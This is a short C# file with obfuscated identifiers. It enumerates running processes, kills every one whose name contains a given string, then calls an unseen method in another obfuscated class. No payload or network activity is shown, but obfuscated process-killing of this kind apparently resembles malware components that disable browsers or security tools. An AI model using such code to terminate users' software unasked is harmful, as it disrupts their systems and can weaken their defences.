using System;
using System.Diagnostics;

namespace dfbDZtGQEYGzK;

public class lxxVzvlgWY
{
	public static bool FZlbVZstjOF(Process ZfUBgNPnTevv, string aaBBJwYJGlcqs)
	{
		try
		{
			return ZfUBgNPnTevv.ProcessName.ToLower().Contains(aaBBJwYJGlcqs.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void SOtnWBmCWVObV(string qVRKeIMxdgaEc, string apcaIxbHSQKV)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (FZlbVZstjOF(process, qVRKeIMxdgaEc.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					sWSXzQkxHH.orYmYqWIcxewG();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
